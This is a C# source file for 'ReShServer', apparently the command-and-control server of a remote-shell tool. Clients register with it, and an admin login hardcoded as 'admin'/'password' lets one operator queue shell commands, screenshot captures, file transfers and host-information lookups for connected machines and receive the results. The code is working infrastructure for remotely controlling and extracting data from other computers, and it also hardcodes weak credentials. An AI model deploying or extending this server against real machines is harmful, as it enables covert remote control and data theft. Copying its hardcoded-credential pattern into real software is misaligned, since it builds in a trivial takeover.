using System;
using System.Buffers.Text;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace ReShServer
{
    public class MyLogger
    {
        //[Conditional("DEBUG")]
        public static void LogDebug(string message)
        {
            // Only compiled when DEBUG is defined
            Console.WriteLine($"[{DateTime.Now}] {message}");
        }

        // This method will always be compiled
        public static void LogError(string message)
        {
            Console.WriteLine($"[ERROR] {message}");
        }
    }
    public enum RSMessageType
    {
        None,
        CallerLogin, CallerLoginResult, ClientOnline, ClientOffline,
        ClientRegister, ClientRegisterResult,
        GetCommand,
        SendCommand,
        CommandResult
    }
    public class RSMessage
    {
        public RSMessageType Type { get; set; }
        public object Data { get; set; }
        public Guid Id { get; set; }

        public static RSMessage None = new RSMessage();
        public RSMessage()
        {
            Type = RSMessageType.None;
            Data = new object();
            Id = Guid.NewGuid();
        }
        public bool TryGetData<T>(out T data)
        {
            data = default!;
            if (Data is JsonElement element)
            {
                T? result = JsonSerializer.Deserialize<T>(element);
                if (result != null)
                {
                    data = result;
                    return true;
                }
                return false;
            }
            // If Data is already of type T, just cast it
            if (Data is T t)
            {
                data = t;
                return true;
            }
            return false;
        }
    }
    public class ClientRegister
    {
        public string UserName { get; set; }
    }
    public class ClientRegisterResult
    {
        public string UserName { get; set; }
        public bool Status { get; set; }
    }
    public class CallerLogin
    {
        public string UserName { get; set; }
        public string Password { get; set; }
    }
    public class ClientInfo
    {
        public Guid ClientId { get; set; }
        public string Name { get; set; }
    }
    public class CallerLoginResult
    {
        public bool Status { get; set; }
        public List<ClientInfo> OnlineClients { get; set; }
    }
    public class ClientOnline
    {
        public ClientInfo Info { get; set; }
    }
    public class ClientOffline
    {
        public Guid ClientId { get; set; }
    }
    public enum CommandType
    {
        GetInfo,
        ShellCommand,
        Screenshot,
        FileTransfer,
    }
    public class Command
    {
        public Guid ClientId { get; set; }
        public CommandType Type { get; set; }
        public object Data { get; set; }
    }
    public class CommandResult
    {
        public Guid ClientId { get; set; }
        public CommandType Type { get; set; }
        public object Data { get; set; }
    }
    public enum InfoType
    {
        MachineName,
        Ip,
        Mac,
    }
    public class GetInfo
    {
        public InfoType Type { get; set; }
    }
    public class GetInfoResult
    {
        public InfoType Type { get; set; }
        public object InfoDate { get; set; }
    }
    public class Shell
    {
        public string Command { get; set; }
    }
    public class ShellResult
    {
        public string Result { get; set; }
    }
    public class Screenshot
    {

    }
    public class ScreenshotResult
    {
        public bool Status { get; set; }
        public byte[] Screenshot { get; set; }
    }
    public class FileTransfer
    {
        public bool TranferToRemote { get; set; }
        public string FromPath { get; set; }
        public string ToPath { get; set; }
    }
    public class FileTransferResult
    {
        public bool TranferToRemote { get; set; }
        public bool Status { get; set; }
        public byte[] FileData { get; set; }
    }
    public static class RSProtocol
    {
        public static Encoding NCGEncoding = Encoding.UTF8;
        public static RSMessage DecodeMessage(byte[] message)
        {
            //It's said that using utf8 rather than string is more effcient
            return JsonSerializer.Deserialize<RSMessage>(NCGEncoding.GetString(message)) ?? new RSMessage();
        }
        public static byte[] EncodeMessage(RSMessageType Type, object Data)
        {
            RSMessage message = new RSMessage();
            message.Type = Type;
            message.Data = Data;
            return EncodeMessage(message);
        }
        public static byte[] EncodeMessage(RSMessage message)
        {
            string actualMsg = JsonSerializer.Serialize(message, new JsonSerializerOptions { WriteIndented = true });
            byte[] actualBytes = NCGEncoding.GetBytes(actualMsg);
            byte[] headerBytes = BitConverter.GetBytes(actualBytes.Length);
            return headerBytes.Concat(actualBytes).ToArray();
            //return [.. headerBytes, .. actualBytes];
        }
    }
    public class ClientHandler
    {
        public Guid ClientId { get; }
        public string Name { get; set; }
        public bool IsLoggedIn = false;
        private readonly TcpClient _tcpClient;
        private readonly NetworkStream _stream;
        private readonly RSServer _server;
        public ClientHandler(Guid id, TcpClient client, RSServer server)
        {
            ClientId = id;
            Random r = new Random(DateTime.Now.Millisecond);
            Name = "UnknowUser_" + r.NextInt64().ToString();
            _tcpClient = client;
            _server = server;
            _stream = _tcpClient.GetStream();
        }
        public async Task HandleCommunicationAsync()
        {
            try
            {
                while (_tcpClient.Connected)
                {
                    // Read the 4-byte header to get the message size
                    byte[] lengthBytes = new byte[4];
                    int totalBytesRead = 0;
                    while (totalBytesRead < lengthBytes.Length)
                    {
                        int bytesRead = await _stream.ReadAsync(lengthBytes, totalBytesRead, lengthBytes.Length - totalBytesRead);
                        if (bytesRead == 0)
                        {
                            // Connection was closed by the server
                            Disconnect();
                            return;
                        }
                        totalBytesRead += bytesRead;
                    }
                    // Convert the length bytes back to an integer
                    int messageLength = BitConverter.ToInt32(lengthBytes, 0);

                    // Now, read the actual message payload
                    byte[] buffer = new byte[messageLength];
                    int payloadBytesRead = 0;
                    while (payloadBytesRead < messageLength)
                    {
                        int bytesRead = await _stream.ReadAsync(buffer, payloadBytesRead, messageLength - payloadBytesRead);
                        if (bytesRead == 0)
                        {
                            // Connection was closed prematurely
                            Disconnect();
                            return;
                        }
                        payloadBytesRead += bytesRead;
                    }
                    RSMessage message = RSProtocol.DecodeMessage(buffer);
                    MyLogger.LogDebug($"[-]Message received:{JsonSerializer.Serialize(message)}");
                    _server.HandleNewMessage(ClientId, message);
                }
            }
            catch (Exception ex)
            {
                MyLogger.LogDebug($"[*]Error handling client {ClientId}: {ex.Message}");
                Disconnect();
            }
        }
        public async Task SendMessageAsync(byte[] data)
        {
            if (_tcpClient.Connected)
            {
                try
                {
                    // Send data asynchronously
                    await _stream.WriteAsync(data, 0, data.Length);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error sending to client {ClientId}: {ex.Message}");
                    Disconnect();
                }
            }
        }
        public async Task SendMessageAsync(RSMessage message)
        {
            byte[] bytes = RSProtocol.EncodeMessage(message);
            MyLogger.LogDebug($"[-]Message sent:{JsonSerializer.Serialize(message)}");
            await SendMessageAsync(bytes);
        }
        public async Task SendMessageAsync(object data, RSMessageType type)
        {
            RSMessage message = new RSMessage();
            message.Data = data;
            message.Type = type;
            byte[] bytes = RSProtocol.EncodeMessage(message);
            MyLogger.LogDebug($"[-]Message sent:{JsonSerializer.Serialize(message)}");
            await SendMessageAsync(bytes);
        }
        public async Task SendCommand(Command command)
        {
            command.ClientId = ClientId;
            RSMessage message = new RSMessage();
            message.Data = command;
            message.Type = RSMessageType.SendCommand;
            byte[] bytes = RSProtocol.EncodeMessage(message);
            MyLogger.LogDebug($"[-]Message sent:{JsonSerializer.Serialize(message)}");
            await SendMessageAsync(bytes);
        }

        public async Task SendCommandResult(CommandResult command)
        {
            command.ClientId = ClientId;
            RSMessage message = new RSMessage();
            message.Data = command;
            message.Type = RSMessageType.CommandResult;
            byte[] bytes = RSProtocol.EncodeMessage(message);
            MyLogger.LogDebug($"[-]Message sent:{JsonSerializer.Serialize(message)}");
            await SendMessageAsync(bytes);
        }
        public void Disconnect()
        {
            MyLogger.LogDebug($"[-]Client {Name} disconnected from server.");
            _tcpClient.Close();
            _server.RemoveClient(ClientId); // Notify server to remove this handler
        }
    }
    public class RSServer
    {
        public Queue<Command> CommandQueue = new Queue<Command>();
        private readonly TcpListener _listener;

        private readonly ConcurrentDictionary<Guid, ClientHandler> _clientHandlers;
        private Guid _adminId;
        public RSServer(int port)
        {
            _listener = new TcpListener(IPAddress.Any, port);
            CommandQueue = new Queue<Command>();
            _clientHandlers = new ConcurrentDictionary<Guid, ClientHandler>();
        }
        public RSServer(string host, int port)
        {
            _listener = new TcpListener(IPAddress.Parse(host), port);
            CommandQueue = new Queue<Command>();
            _clientHandlers = new ConcurrentDictionary<Guid, ClientHandler>();
        }
        public async Task StartAsync()
        {
            MyLogger.LogDebug("[-]Starting server.");
            //Start listening for incoming connections
            _listener.Start();
            while (true)
            {
                //Accept new client connections
                TcpClient client = await _listener.AcceptTcpClientAsync();

                //Generate a new client handler
                Guid clientId = Guid.NewGuid();
                MyLogger.LogDebug($"[-]Client connected: {client.Client.RemoteEndPoint} Id: {clientId}");

                ClientHandler clientHandler = new ClientHandler(clientId, client, this);
                _clientHandlers.TryAdd(clientId, clientHandler);
                //Start handling communication with the client
                _ = Task.Run(() => clientHandler.HandleCommunicationAsync());
            }
        }
        public void Stop()
        {
            foreach (var clientHandler in _clientHandlers.Values)
            {
                clientHandler.Disconnect();
            }
            _listener.Stop();
        }

        /// <summary>
        /// Handle new incoming message from client based on message type.
        /// </summary>
        /// <param name="clientId">Client Id</param>
        /// <param name="message">Message to handle</param>
        public async void HandleNewMessage(Guid clientId, RSMessage message)
        {
            ClientHandler client = _clientHandlers[clientId];
            if (message != RSMessage.None)
            {
                switch (message.Type)
                {
                    case RSMessageType.ClientRegister:
                        {
                            ClientRegister request;
                            ClientRegisterResult response = new ClientRegisterResult();
                            if (!message.TryGetData(out request))
                                goto default;
                            client.Name = request.UserName;
                            client.IsLoggedIn = true;

                            response.Status = true;
                            response.UserName = client.Name;
                            await client.SendMessageAsync(response, RSMessageType.ClientRegisterResult);
                            ClientHandler? adminClient;
                            if (_clientHandlers.TryGetValue(_adminId, out adminClient)) {
                                await adminClient.SendMessageAsync(new ClientOnline { 
                                    Info = new ClientInfo { 
                                        ClientId = clientId, 
                                        Name = client.Name 
                                    }
                                }, RSMessageType.ClientOnline);
                            }
                            break;
                        }
                    case RSMessageType.GetCommand:
                        {
                            if (CommandQueue.Count > 0)
                            {
                                foreach (var command in CommandQueue)
                                {
                                    if (command.ClientId == clientId)
                                    {
                                        await client.SendCommand(CommandQueue.Dequeue());
                                        break;
                                    }
                                }
                            }
                            break;
                        }
                    case RSMessageType.CallerLogin:
                        {
                            CallerLogin request;
                            if (!message.TryGetData(out request))
                                goto default;
                            CallerLoginResult response = new CallerLoginResult();
                            if (request.UserName == "admin" && request.Password == "password" && _adminId == Guid.Empty) // Simple hardcoded check
                            {
                                response.Status = true;
                                response.OnlineClients = _clientHandlers.Values
                                    .Where(c => c.IsLoggedIn)
                                    .Select(c => new ClientInfo { ClientId = c.ClientId, Name = c.Name })
                                    .ToList();
                                client.IsLoggedIn = true;
                                client.Name = "admin";
                                _adminId = clientId;
                            }
                            else
                            {
                                response.Status = false;
                            }
                            await client.SendMessageAsync(response, RSMessageType.CallerLoginResult);
                            break;
                        }
                    case RSMessageType.SendCommand:
                        {
                            Command command;
                            if (!message.TryGetData(out command))
                                goto default;
                            if (clientId != _adminId)
                            {
                                MyLogger.LogDebug($"[*]Unauthorized GetClientList request from client {client.Name}");
                                return;
                            }
                            if (_clientHandlers.ContainsKey(command.ClientId))
                            {
                                CommandQueue.Enqueue(command);
                            }
                            else
                            {
                                MyLogger.LogDebug($"[*]Target client {command.ClientId} not found for user {client.Name}");
                            }
                            MyLogger.LogDebug($"[-]New command added to queue by user {client.Name}, CommandType: {message.Type}");
                            break;
                        }
                    case RSMessageType.CommandResult:
                        {
                            CommandResult result;
                            if (!message.TryGetData(out result))
                                goto default;
                            if (_clientHandlers.ContainsKey(_adminId))
                                await _clientHandlers[_adminId].SendMessageAsync(message);
                            break;
                        }
                    default:
                        {
                            MyLogger.LogDebug($"[*]Unknow message type.");
                            break;
                        }
                }
            }
            else
            {
                MyLogger.LogDebug($"[*]Error: none message");
            }
        }
        public void RemoveClient(Guid clientId)
        {
            if (clientId == _adminId)
            {
                //Admin disconnected
                _adminId = Guid.Empty;
            }
            else
            {
                //Notify admin client
                ClientHandler? adminClient;
                if (_clientHandlers.TryGetValue(_adminId, out adminClient))
                {
                    _ = adminClient.SendMessageAsync(new ClientOffline
                    {
                        ClientId = clientId
                    }, RSMessageType.ClientOffline);
                }
            }
            if (_clientHandlers.TryRemove(clientId, out _))
            {
                MyLogger.LogDebug($"[-]Client {clientId} removed.");
            }
        }
        public async void BroadcastMessageAsync(RSMessage message)
        {
            foreach (ClientHandler client in _clientHandlers.Values)
            {
                if (client.IsLoggedIn)
                    await client.SendMessageAsync(message);
            }
        }
    }

    
}
